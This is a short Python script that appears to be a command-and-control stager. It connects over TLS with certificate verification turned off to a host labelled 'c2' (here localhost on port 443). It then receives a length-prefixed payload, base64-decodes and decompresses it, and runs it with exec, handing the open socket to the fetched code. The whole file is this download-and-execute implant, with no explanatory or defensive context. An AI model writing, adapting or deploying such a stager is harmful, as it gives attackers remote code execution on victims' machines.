import socket 
import ssl   
import os
import threading
import time
import zlib
import base64
import struct
c2 = 'localhost'
port = 443
context=ssl._create_unverified_context()
with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
    with context.wrap_socket(sock, server_hostname=c2) as ssock:
         ssock.connect((c2, port))
         sent = struct.unpack('>I',ssock.recv(12000))[0]
         payload = ssock.recv(sent)
         while len(payload) < sent:
            payload += ssock.recv(sent-len(payload))
         exec(zlib.decompress(base64.b64decode(payload)), {'s':ssock})